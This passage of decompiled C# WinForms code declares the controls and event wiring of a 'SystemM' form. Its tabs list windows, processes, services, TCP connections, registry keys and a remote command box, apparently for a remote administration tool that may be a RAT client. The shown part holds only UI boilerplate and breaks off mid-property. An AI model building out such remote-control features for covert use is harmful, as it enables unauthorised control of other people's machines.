using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using ClientG.My;
using ClientG.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ClientG;

[DesignerGenerated]
public class SystemM : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("EtherealTabControl1")]
	private EtherealTabControl _EtherealTabControl1;

	[AccessedThroughProperty("TabPage1")]
	private TabPage _TabPage1;

	[AccessedThroughProperty("TabPage2")]
	private TabPage _TabPage2;

	[AccessedThroughProperty("TabPage3")]
	private TabPage _TabPage3;

	[AccessedThroughProperty("TabPage4")]
	private TabPage _TabPage4;

	[AccessedThroughProperty("TabPage5")]
	private TabPage _TabPage5;

	[AccessedThroughProperty("TabPage6")]
	private TabPage _TabPage6;

	[AccessedThroughProperty("TabPage7")]
	private TabPage _TabPage7;

	[AccessedThroughProperty("ImageList1")]
	private ImageList _ImageList1;

	[AccessedThroughProperty("AW")]
	private ListView _AW;

	[AccessedThroughProperty("ColumnHeader1")]
	private ColumnHeader _ColumnHeader1;

	[AccessedThroughProperty("ColumnHeader2")]
	private ColumnHeader _ColumnHeader2;

	[AccessedThroughProperty("ColumnHeader3")]
	private ColumnHeader _ColumnHeader3;

	[AccessedThroughProperty("Images")]
	private ImageList _Images;

	[AccessedThroughProperty("RegIcons")]
	private ImageList _RegIcons;

	[AccessedThroughProperty("AWCL")]
	private ContextMenuStrip _AWCL;

	[AccessedThroughProperty("HKMenu")]
	private ContextMenuStrip _HKMenu;

	[AccessedThroughProperty("HKVMenu")]
	private ContextMenuStrip _HKVMenu;

	[AccessedThroughProperty("PITMenu")]
	private ContextMenuStrip _PITMenu;

	[AccessedThroughProperty("PMenustrip")]
	private ContextMenuStrip _PMenustrip;

	[AccessedThroughProperty("TCPCL")]
	private ContextMenuStrip _TCPCL;

	[AccessedThroughProperty("SMCL")]
	private ContextMenuStrip _SMCL;

	[AccessedThroughProperty("RefreshToolStripMenuItem")]
	private ToolStripMenuItem _RefreshToolStripMenuItem;

	[AccessedThroughProperty("HideToolStripMenuItem")]
	private ToolStripMenuItem _HideToolStripMenuItem;

	[AccessedThroughProperty("ShowToolStripMenuItem")]
	private ToolStripMenuItem _ShowToolStripMenuItem;

	[AccessedThroughProperty("RenameToolStripMenuItem")]
	private ToolStripMenuItem _RenameToolStripMenuItem;

	[AccessedThroughProperty("MaximizeToolStripMenuItem")]
	private ToolStripMenuItem _MaximizeToolStripMenuItem;

	[AccessedThroughProperty("MinimizeToolStripMenuItem")]
	private ToolStripMenuItem _MinimizeToolStripMenuItem;

	[AccessedThroughProperty("LoToolStripMenuItem")]
	private ToolStripMenuItem _LoToolStripMenuItem;

	[AccessedThroughProperty("UnlockXButtonToolStripMenuItem")]
	private ToolStripMenuItem _UnlockXButtonToolStripMenuItem;

	[AccessedThroughProperty("RefreshToolStripMenuItem1")]
	private ToolStripMenuItem _RefreshToolStripMenuItem1;

	[AccessedThroughProperty("CreateKeyToolStripMenuItem")]
	private ToolStripMenuItem _CreateKeyToolStripMenuItem;

	[AccessedThroughProperty("DeleteSelectedToolStripMenuItem")]
	private ToolStripMenuItem _DeleteSelectedToolStripMenuItem;

	[AccessedThroughProperty("RefreshToolStripMenuItem2")]
	private ToolStripMenuItem _RefreshToolStripMenuItem2;

	[AccessedThroughProperty("NewToolStripMenuItem")]
	private ToolStripMenuItem _NewToolStripMenuItem;

	[AccessedThroughProperty("StringToolStripMenuItem")]
	private ToolStripMenuItem _StringToolStripMenuItem;

	[AccessedThroughProperty("BinaryToolStripMenuItem")]
	private ToolStripMenuItem _BinaryToolStripMenuItem;

	[AccessedThroughProperty("DWOToolStripMenuItem")]
	private ToolStripMenuItem _DWOToolStripMenuItem;

	[AccessedThroughProperty("QWORDToolStripMenuItem")]
	private ToolStripMenuItem _QWORDToolStripMenuItem;

	[AccessedThroughProperty("MultiStringToolStripMenuItem")]
	private ToolStripMenuItem _MultiStringToolStripMenuItem;

	[AccessedThroughProperty("ExpandStringToolStripMenuItem")]
	private ToolStripMenuItem _ExpandStringToolStripMenuItem;

	[AccessedThroughProperty("DeleteToolStripMenuItem")]
	private ToolStripMenuItem _DeleteToolStripMenuItem;

	[AccessedThroughProperty("RefreshToolStripMenuItem3")]
	private ToolStripMenuItem _RefreshToolStripMenuItem3;

	[AccessedThroughProperty("StartToolStripMenuItem")]
	private ToolStripMenuItem _StartToolStripMenuItem;

	[AccessedThroughProperty("PauseToolStripMenuItem")]
	private ToolStripMenuItem _PauseToolStripMenuItem;

	[AccessedThroughProperty("PauseToolStripMenuItem1")]
	private ToolStripMenuItem _PauseToolStripMenuItem1;

	[AccessedThroughProperty("RestartToolStripMenuItem")]
	private ToolStripMenuItem _RestartToolStripMenuItem;

	[AccessedThroughProperty("RefreshServiceToolStripMenuItem")]
	private ToolStripMenuItem _RefreshServiceToolStripMenuItem;

	[AccessedThroughProperty("RefreshToolStripMenuItem4")]
	private ToolStripMenuItem _RefreshToolStripMenuItem4;

	[AccessedThroughProperty("KillDeleteToolStripMenuItem")]
	private ToolStripMenuItem _KillDeleteToolStripMenuItem;

	[AccessedThroughProperty("KillProcessToolStripMenuItem")]
	private ToolStripMenuItem _KillProcessToolStripMenuItem;

	[AccessedThroughProperty("RestartProcessToolStripMenuItem")]
	private ToolStripMenuItem _RestartProcessToolStripMenuItem;

	[AccessedThroughProperty("SuspendProcessToolStripMenuItem")]
	private ToolStripMenuItem _SuspendProcessToolStripMenuItem;

	[AccessedThroughProperty("ResumeProcessToolStripMenuItem")]
	private ToolStripMenuItem _ResumeProcessToolStripMenuItem;

	[AccessedThroughProperty("RefreshToolStripMenuItem5")]
	private ToolStripMenuItem _RefreshToolStripMenuItem5;

	[AccessedThroughProperty("KillConnectionToolStripMenuItem")]
	private ToolStripMenuItem _KillConnectionToolStripMenuItem;

	[AccessedThroughProperty("RefreshToolStripMenuItem6")]
	private ToolStripMenuItem _RefreshToolStripMenuItem6;

	[AccessedThroughProperty("RemoveToolStripMenuItem")]
	private ToolStripMenuItem _RemoveToolStripMenuItem;

	[AccessedThroughProperty("Processlists")]
	private ListView _Processlists;

	[AccessedThroughProperty("ColumnHeader4")]
	private ColumnHeader _ColumnHeader4;

	[AccessedThroughProperty("ColumnHeader5")]
	private ColumnHeader _ColumnHeader5;

	[AccessedThroughProperty("ColumnHeader6")]
	private ColumnHeader _ColumnHeader6;

	[AccessedThroughProperty("ColumnHeader7")]
	private ColumnHeader _ColumnHeader7;

	[AccessedThroughProperty("ColumnHeader8")]
	private ColumnHeader _ColumnHeader8;

	[AccessedThroughProperty("ColumnHeader9")]
	private ColumnHeader _ColumnHeader9;

	[AccessedThroughProperty("SM")]
	private ListView _SM;

	[AccessedThroughProperty("ColumnHeader10")]
	private ColumnHeader _ColumnHeader10;

	[AccessedThroughProperty("ColumnHeader11")]
	private ColumnHeader _ColumnHeader11;

	[AccessedThroughProperty("ColumnHeader12")]
	private ColumnHeader _ColumnHeader12;

	[AccessedThroughProperty("ColumnHeader13")]
	private ColumnHeader _ColumnHeader13;

	[AccessedThroughProperty("ColumnHeader14")]
	private ColumnHeader _ColumnHeader14;

	[AccessedThroughProperty("TCPC")]
	private ListView _TCPC;

	[AccessedThroughProperty("ColumnHeader15")]
	private ColumnHeader _ColumnHeader15;

	[AccessedThroughProperty("ColumnHeader16")]
	private ColumnHeader _ColumnHeader16;

	[AccessedThroughProperty("ColumnHeader17")]
	private ColumnHeader _ColumnHeader17;

	[AccessedThroughProperty("ColumnHeader18")]
	private ColumnHeader _ColumnHeader18;

	[AccessedThroughProperty("ColumnHeader19")]
	private ColumnHeader _ColumnHeader19;

	[AccessedThroughProperty("PIIT")]
	private ListView _PIIT;

	[AccessedThroughProperty("ColumnHeader20")]
	private ColumnHeader _ColumnHeader20;

	[AccessedThroughProperty("Commands")]
	private TextBox _Commands;

	[AccessedThroughProperty("Panel3")]
	private Panel _Panel3;

	[AccessedThroughProperty("ResultCMD")]
	private TextBox _ResultCMD;

	[AccessedThroughProperty("Panel2")]
	private Panel _Panel2;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("MenuStrip1")]
	private MenuStrip _MenuStrip1;

	[AccessedThroughProperty("StartToolStripMenuItem1")]
	private ToolStripMenuItem _StartToolStripMenuItem1;

	[AccessedThroughProperty("StatusStrip1")]
	private StatusStrip _StatusStrip1;

	[AccessedThroughProperty("ToolStripStatusLabel9")]
	private ToolStripStatusLabel _ToolStripStatusLabel9;

	[AccessedThroughProperty("StatusStrip2")]
	private StatusStrip _StatusStrip2;

	[AccessedThroughProperty("ToolStripStatusLabel6")]
	private ToolStripStatusLabel _ToolStripStatusLabel6;

	[AccessedThroughProperty("StatusStrip3")]
	private StatusStrip _StatusStrip3;

	[AccessedThroughProperty("ToolStripStatusLabel3")]
	private ToolStripStatusLabel _ToolStripStatusLabel3;

	[AccessedThroughProperty("StatusStrip4")]
	private StatusStrip _StatusStrip4;

	[AccessedThroughProperty("ToolStripStatusLabel5")]
	private ToolStripStatusLabel _ToolStripStatusLabel5;

	[AccessedThroughProperty("ToolStripStatusLabel8")]
	private ToolStripStatusLabel _ToolStripStatusLabel8;

	[AccessedThroughProperty("StatusStrip5")]
	private StatusStrip _StatusStrip5;

	[AccessedThroughProperty("ToolStripStatusLabel1")]
	private ToolStripStatusLabel _ToolStripStatusLabel1;

	[AccessedThroughProperty("ToolStripStatusLabel2")]
	private ToolStripStatusLabel _ToolStripStatusLabel2;

	[AccessedThroughProperty("ToolStripStatusLabel4")]
	private ToolStripStatusLabel _ToolStripStatusLabel4;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("RegValues")]
	private ComboBox _RegValues;

	[AccessedThroughProperty("RegPath")]
	private Label _RegPath;

	[AccessedThroughProperty("ValuesRegName")]
	private ListView _ValuesRegName;

	[AccessedThroughProperty("KeysName")]
	private ListView _KeysName;

	[AccessedThroughProperty("StatusStrip6")]
	private StatusStrip _StatusStrip6;

	[AccessedThroughProperty("ToolStripStatusLabel7")]
	private ToolStripStatusLabel _ToolStripStatusLabel7;

	[AccessedThroughProperty("ColumnHeader22")]
	private ColumnHeader _ColumnHeader22;

	[AccessedThroughProperty("ColumnHeader23")]
	private ColumnHeader _ColumnHeader23;

	[AccessedThroughProperty("ColumnHeader24")]
	private ColumnHeader _ColumnHeader24;

	[AccessedThroughProperty("ColumnHeader21")]
	private ColumnHeader _ColumnHeader21;

	[AccessedThroughProperty("MenuStrip2")]
	private MenuStrip _MenuStrip2;

	[AccessedThroughProperty("ColumnHeader25")]
	private ColumnHeader _ColumnHeader25;

	[AccessedThroughProperty("ColumnHeader26")]
	private ColumnHeader _ColumnHeader26;

	[AccessedThroughProperty("ColumnHeader27")]
	private ColumnHeader _ColumnHeader27;

	[AccessedThroughProperty("ColumnHeader28")]
	private ColumnHeader _ColumnHeader28;

	[AccessedThroughProperty("ColumnHeader29")]
	private ColumnHeader _ColumnHeader29;

	[AccessedThroughProperty("ColumnHeader30")]
	private ColumnHeader _ColumnHeader30;

	[AccessedThroughProperty("ColumnHeader31")]
	private ColumnHeader _ColumnHeader31;

	[AccessedThroughProperty("ColumnHeader32")]
	private ColumnHeader _ColumnHeader32;

	[AccessedThroughProperty("ImageList2")]
	private ImageList _ImageList2;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Panel5")]
	private Panel _Panel5;

	[AccessedThroughProperty("Panel4")]
	private Panel _Panel4;

	[AccessedThroughProperty("CopyPathToolStripMenuItem")]
	private ToolStripMenuItem _CopyPathToolStripMenuItem;

	[AccessedThroughProperty("ImageList3")]
	private ImageList _ImageList3;

	[AccessedThroughProperty("PrToolStripMenuItem")]
	private ToolStripMenuItem _PrToolStripMenuItem;

	public int CloseWait;

	public int Established;

	public int Listen;

	private ColumnHeader m_SortingColumn;

	public int N;

	public int sock;

	public int Time_Wait;

	internal virtual EtherealTabControl EtherealTabControl1
	{
		[DebuggerNonUserCode]
		get
		{
			return _EtherealTabControl1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_EtherealTabControl1 = value;
		}
	}

	internal virtual TabPage TabPage1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage1 = value;
		}
	}

	internal virtual TabPage TabPage2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage2 = value;
		}
	}

	internal virtual TabPage TabPage3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage3 = value;
		}
	}

	internal virtual TabPage TabPage4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage4 = value;
		}
	}

	internal virtual TabPage TabPage5
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage5 = value;
		}
	}

	internal virtual TabPage TabPage6
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage6 = value;
		}
	}

	internal virtual TabPage TabPage7
	{
		[DebuggerNonUserCode]
		get
		{
			return _TabPage7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TabPage7 = value;
		}
	}

	internal virtual ImageList ImageList1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ImageList1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ImageList1 = value;
		}
	}

	internal virtual ListView AW
	{
		[DebuggerNonUserCode]
		get
		{
			return _AW;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			ColumnClickEventHandler val = new ColumnClickEventHandler(AW_ColumnClick);
			if (_AW != null)
			{
				_AW.remove_ColumnClick(val);
			}
			_AW = value;
			if (_AW != null)
			{
				_AW.add_ColumnClick(val);
			}
		}
	}

	internal virtual ColumnHeader ColumnHeader1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader1 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader2
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader2 = value;
		}
	}

	internal virtual ColumnHeader ColumnHeader3
	{
		[DebuggerNonUserCode]
		get
		{
			return _ColumnHeader3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ColumnHeader3 = value;
		}
	}

	internal virtual ImageList Images
	{
		[DebuggerNonUserCode]
		get
		{
			return _Images;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Images = value;
		}
	}

	internal virtual ImageList RegIcons
	{
		[DebuggerNonUserCode]
		get
		{
			return _RegIcons;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RegIcons = value;
		}
	}

	internal virtual ContextMenuStrip AWCL
	{
		[DebuggerNonUserCode]
		get
		{
			return _AWCL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_AWCL = value;
		}
	}

	internal virtual ContextMenuStrip HKMenu
	{
		[DebuggerNonUserCode]
		get
		{
			return _HKMenu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_HKMenu = value;
		}
	}

	internal virtual ContextMenuStrip HKVMenu
	{
		[DebuggerNonUserCode]
		get
		{
			return _HKVMenu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_HKVMenu = value;
		}
	}

	internal virtual ContextMenuStrip PITMenu
	{
		[DebuggerNonUserCode]
		get
		{
			return _PITMenu;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PITMenu = value;
		}
	}

	internal virtual ContextMenuStrip PMenustrip
	{
		[DebuggerNonUserCode]
		get
		{
			return _PMenustrip;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PMenustrip = value;
		}
	}

	internal virtual ContextMenuStrip TCPCL
	{
		[DebuggerNonUserCode]
		get
		{
			return _TCPCL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TCPCL = value;
		}
	}

	internal virtual ContextMenuStrip SMCL
	{
		[DebuggerNonUserCode]
		get
		{
			return _SMCL;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_SMCL = value;
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem_Click;
			if (_RefreshToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem = value;
			if (_RefreshToolStripMenuItem != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem HideToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _HideToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = HideToolStripMenuItem_Click;
			if (_HideToolStripMenuItem != null)
			{
				((ToolStripItem)_HideToolStripMenuItem).remove_Click(eventHandler);
			}
			_HideToolStripMenuItem = value;
			if (_HideToolStripMenuItem != null)
			{
				((ToolStripItem)_HideToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ShowToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ShowToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ShowToolStripMenuItem_Click;
			if (_ShowToolStripMenuItem != null)
			{
				((ToolStripItem)_ShowToolStripMenuItem).remove_Click(eventHandler);
			}
			_ShowToolStripMenuItem = value;
			if (_ShowToolStripMenuItem != null)
			{
				((ToolStripItem)_ShowToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RenameToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _RenameToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RenameToolStripMenuItem_Click;
			if (_RenameToolStripMenuItem != null)
			{
				((ToolStripItem)_RenameToolStripMenuItem).remove_Click(eventHandler);
			}
			_RenameToolStripMenuItem = value;
			if (_RenameToolStripMenuItem != null)
			{
				((ToolStripItem)_RenameToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem MaximizeToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _MaximizeToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = MaximizeToolStripMenuItem_Click;
			if (_MaximizeToolStripMenuItem != null)
			{
				((ToolStripItem)_MaximizeToolStripMenuItem).remove_Click(eventHandler);
			}
			_MaximizeToolStripMenuItem = value;
			if (_MaximizeToolStripMenuItem != null)
			{
				((ToolStripItem)_MaximizeToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem MinimizeToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _MinimizeToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = MinimizeToolStripMenuItem_Click;
			if (_MinimizeToolStripMenuItem != null)
			{
				((ToolStripItem)_MinimizeToolStripMenuItem).remove_Click(eventHandler);
			}
			_MinimizeToolStripMenuItem = value;
			if (_MinimizeToolStripMenuItem != null)
			{
				((ToolStripItem)_MinimizeToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem LoToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _LoToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = LoToolStripMenuItem_Click;
			if (_LoToolStripMenuItem != null)
			{
				((ToolStripItem)_LoToolStripMenuItem).remove_Click(eventHandler);
			}
			_LoToolStripMenuItem = value;
			if (_LoToolStripMenuItem != null)
			{
				((ToolStripItem)_LoToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem UnlockXButtonToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _UnlockXButtonToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = UnlockXButtonToolStripMenuItem_Click;
			if (_UnlockXButtonToolStripMenuItem != null)
			{
				((ToolStripItem)_UnlockXButtonToolStripMenuItem).remove_Click(eventHandler);
			}
			_UnlockXButtonToolStripMenuItem = value;
			if (_UnlockXButtonToolStripMenuItem != null)
			{
				((ToolStripItem)_UnlockXButtonToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem1_Click;
			if (_RefreshToolStripMenuItem1 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem1).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem1 = value;
			if (_RefreshToolStripMenuItem1 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem CreateKeyToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _CreateKeyToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = CreateKeyToolStripMenuItem_Click;
			if (_CreateKeyToolStripMenuItem != null)
			{
				((ToolStripItem)_CreateKeyToolStripMenuItem).remove_Click(eventHandler);
			}
			_CreateKeyToolStripMenuItem = value;
			if (_CreateKeyToolStripMenuItem != null)
			{
				((ToolStripItem)_CreateKeyToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DeleteSelectedToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DeleteSelectedToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DeleteSelectedToolStripMenuItem_Click;
			if (_DeleteSelectedToolStripMenuItem != null)
			{
				((ToolStripItem)_DeleteSelectedToolStripMenuItem).remove_Click(eventHandler);
			}
			_DeleteSelectedToolStripMenuItem = value;
			if (_DeleteSelectedToolStripMenuItem != null)
			{
				((ToolStripItem)_DeleteSelectedToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RefreshToolStripMenuItem2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = RefreshToolStripMenuItem2_Click;
			if (_RefreshToolStripMenuItem2 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem2).remove_Click(eventHandler);
			}
			_RefreshToolStripMenuItem2 = value;
			if (_RefreshToolStripMenuItem2 != null)
			{
				((ToolStripItem)_RefreshToolStripMenuItem2).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem NewToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _NewToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NewToolStripMenuItem = value;
		}
	}

	internal virtual ToolStripMenuItem StringToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _StringToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = StringToolStripMenuItem_Click;
			if (_StringToolStripMenuItem != null)
			{
				((ToolStripItem)_StringToolStripMenuItem).remove_Click(eventHandler);
			}
			_StringToolStripMenuItem = value;
			if (_StringToolStripMenuItem != null)
			{
				((ToolStripItem)_StringToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem BinaryToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _BinaryToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = BinaryToolStripMenuItem_Click;
			if (_BinaryToolStripMenuItem != null)
			{
				((ToolStripItem)_BinaryToolStripMenuItem).remove_Click(eventHandler);
			}
			_BinaryToolStripMenuItem = value;
			if (_BinaryToolStripMenuItem != null)
			{
				((ToolStripItem)_BinaryToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DWOToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DWOToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DWOToolStripMenuItem_Click;
			if (_DWOToolStripMenuItem != null)
			{
				((ToolStripItem)_DWOToolStripMenuItem).remove_Click(eventHandler);
			}
			_DWOToolStripMenuItem = value;
			if (_DWOToolStripMenuItem != null)
			{
				((ToolStripItem)_DWOToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem QWORDToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _QWORDToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = QWORDToolStripMenuItem_Click;
			if (_QWORDToolStripMenuItem != null)
			{
				((ToolStripItem)_QWORDToolStripMenuItem).remove_Click(eventHandler);
			}
			_QWORDToolStripMenuItem = value;
			if (_QWORDToolStripMenuItem != null)
			{
				((ToolStripItem)_QWORDToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem MultiStringToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _MultiStringToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = MultiStringToolStripMenuItem_Click;
			if (_MultiStringToolStripMenuItem != null)
			{
				((ToolStripItem)_MultiStringToolStripMenuItem).remove_Click(eventHandler);
			}
			_MultiStringToolStripMenuItem = value;
			if (_MultiStringToolStripMenuItem != null)
			{
				((ToolStripItem)_MultiStringToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem ExpandStringToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _ExpandStringToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = ExpandStringToolStripMenuItem_Click;
			if (_ExpandStringToolStripMenuItem != null)
			{
				((ToolStripItem)_ExpandStringToolStripMenuItem).remove_Click(eventHandler);
			}
			_ExpandStringToolStripMenuItem = value;
			if (_ExpandStringToolStripMenuItem != null)
			{
				((ToolStripItem)_ExpandStringToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem DeleteToolStripMenuItem
	{
		[DebuggerNonUserCode]
		get
		{
			return _DeleteToolStripMenuItem;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = DeleteToolStripMenuItem_Click;
			if (_DeleteToolStripMenuItem != null)
			{
				((ToolStripItem)_DeleteToolStripMenuItem).remove_Click(eventHandler);
			}
			_DeleteToolStripMenuItem = value;
			if (_DeleteToolStripMenuItem != null)
			{
				((ToolStripItem)_DeleteToolStripMenuItem).add_Click(eventHandler);
			}
		}
	}

	internal virtual ToolStripMenuItem RefreshToolStripMenuItem3
	{
		[DebuggerNonUserCode]
		get
